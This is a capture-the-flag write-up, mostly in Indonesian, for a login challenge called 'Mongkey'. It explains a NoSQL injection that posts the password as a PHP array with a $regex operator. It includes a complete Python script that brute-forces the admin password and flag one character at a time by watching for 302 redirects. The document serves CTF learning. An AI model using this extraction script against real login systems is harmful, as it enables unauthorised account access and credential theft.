# Mongkey
> Can you login as admin?
> http://103.167.136.89:10002/
> guest:guest
> 
> PS: No need to brute force using wordlists
> 
> Author: bleedz#0666 (Discord) / @bl33dz (Tele)
## About the Challenge
Diberikan sebuah website dengan tampilan login, dengan hint "Do you know if it is possible to post an array in PHP?".

<img width="917" alt="image" src="https://github.com/dotnaonweh/ForestyCTF/assets/49785290/2f3c053e-4e2f-4cf8-a222-b4761596354a">


## How to Solve?
Pada challenge ini kita diharuskan untuk login sebagai admin, awalnya sempat bingung karena hanya terdapat username saja dan tidak boleh melakukan brute force. Setelah mencari referensi dengan hint yang diberikan diketahui kalau ini merupakan NoSQL Injection.

Referensi : https://blog.0daylabs.com/2016/09/05/mongo-db-password-extraction-mmactf-100/

Dari website tersebut didapatkan code untuk mengextract flag nya 
```
import requests
import string

flag = "ForestyHC{"
url = "http://103.167.136.89:10002/"

# Each time a 302 redirect is seen, we should restart the loop

restart = True

while restart:
    restart = False

    # Characters like *, ., &, and + has to be avoided because we use regex

    for i in string.ascii_letters + string.digits + "!@#$%^()@_{}":
        payload = flag + i
        post_data = {'username': 'admin', 'password[$regex]': payload + ".*"}
        r = requests.post(url, data=post_data, allow_redirects=False)

        # A correct password means we get a 302 redirect

        if r.status_code == 302:
            print(payload)
            restart = True
            flag = payload

            # Exit if "}" gives a valid redirect
            if i == "}":
                print("\nFlag: " + flag)

                exit(0)
            break
```

Langsung saja coba jalankan code nya, didapat bahwa flag nya yaitu 

<img width="257" alt="image" src="https://github.com/dotnaonweh/ForestyCTF/assets/49785290/e9a9b863-c454-46e3-af8d-72e2d90fc594">

```
ForestyHC{reject_humanity_return_to_monke_5543d8}
```
